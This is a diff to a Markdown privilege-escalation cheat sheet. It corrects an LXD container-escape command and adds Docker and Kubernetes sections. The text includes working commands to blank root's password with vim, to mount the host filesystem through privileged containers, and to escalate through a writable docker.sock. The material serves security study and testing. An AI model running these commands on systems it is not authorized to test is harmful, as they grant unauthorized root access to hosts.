@@ -70,7 +70,7 @@ The [GTFOBins](https://gtfobins.github.io/) project is a curated list of binarie
 3. Start LXD : `lxd init` (*this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) can help with this*)
 4. Import local image : `lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine`
 5. Start a privileged container : `lxc init alpine [name] -c security.privileged=true`
-6. Mount the host filesystem : `lsx config device add [name] mydev disk source=/ path=/mnt/root recursive=true`
+6. Mount the host filesystem : `lxc config device add [name] mydev disk source=/ path=/mnt/root recursive=true`
 7. Start the container : `lxc start [name]`
 8. Exec into the container : `lxc exec [name] /bin/sh`
 
@@ -136,3 +136,49 @@ $ /usr/bin/vim.basic /etc/passwd
 echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd
 ```
 > This removes the password field making it so root has no password.
+
+## Docker
+Aside from shared directories via mounts and volumes, we can do a number of other attacks via docker.
+
+```bash
+docker run --rm -it --privileged -v /:/hostsys [img] /bin/bash
+```
+
+If the docker socket is exposed inside a container, we could install docker and point it to the socket file, this would allow us to interact with the docker daemon.
+
+```bash
+docker -H unix:///app/docker.sock ps
+```
+
+We can use this to elevate our privileges as we can create other containers.
+
+```bash
+docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+
+docker -H unix:///app/docker.sock exec -it [id] /bin/bash
+```
+
+This could allow us to gain additional access or even step towards escaping our container entirely.
+
+If we are on the original host and find that the `docker.sock` is writable, we can escalate our privileges.
+```bash
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+```
+
+## Kubernetes
+Kubernetes security is split into several domains:
+- Cluster infrastructure security - *Actual hardware the cluster is made up of*
+- Cluster configuration security - *Software security configuration of the k8s deployment*
+- Application security - *Applications running inside the cluster*
+- Data security - *Data stored/processed within the cluster*
+### Control Plane
+The Control Plane serves as the management layer in a k8s cluster. It consists of several crucial components:
+- **etcd** : 2379/tcp, 2380/tcp
+- **API Server** : 6443/tcp
+- **Scheduler** : 10251/tcp
+- **Controller Manager** : 10252/tcp
+- **Kubelet API** : 10250/tcp
+- **Read-Only Kubelet API** : 10255/tcp
+
+The **Scheduler** (based on the **API Server**) maintains a state of the cluster, and schedules new pods on the nodes. After a node has been decided for a pod, the **API Server** updates the **etcd**.
+
